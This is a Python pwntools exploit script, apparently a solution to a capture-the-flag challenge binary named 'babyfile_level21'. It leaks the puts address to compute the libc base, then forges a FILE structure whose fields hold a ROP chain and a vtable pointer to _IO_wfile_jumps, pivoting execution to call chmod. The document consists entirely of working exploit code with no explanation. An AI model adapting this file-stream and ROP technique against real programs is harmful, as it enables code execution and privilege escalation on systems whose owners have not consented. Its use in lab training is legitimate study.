from pwn import *
context(os='linux', arch='amd64', log_level='debug')
fp = FileStructure()
puts=0x84420
pop_rdi_ret=0x128B8D
pop_rsi_ret=0x2601F
leave_ret=0x578C8
_IO_wfile_jumps=0x1e8f60#0x1E8DE0
stderr=0x1ed5c0
stdin=0x1721F
chmod=0x10dd80

p=process("/challenge/babyfile_level21")
p.recvuntil("puts() within libc is: 0x",drop=True)
puts_real_addr=int(p.recv(12),16)
print("[Leak]:puts_addr=",hex(puts_real_addr))
libc=puts_real_addr-puts
pop_rdi_ret+=libc
pop_rsi_ret+=libc
puts+=libc
leave_ret+=libc
_IO_wfile_jumps+=libc
stderr+=libc
stdin+=libc
chmod+=libc

fp._IO_read_ptr=pop_rdi_ret
fp._IO_read_end=stdin
fp._IO_read_base=pop_rsi_ret
fp._IO_write_base=4
fp._IO_write_ptr=chmod
fp._IO_write_end=0
fp.vtable=_IO_wfile_jumps
fp._lock=stderr+48
fp._wide_data=stderr-0x48
fp._codecvt=stderr
fp.chain=leave_ret
print("payload=",bytes(fp))
p.send(bytes(fp))
p.interactive()
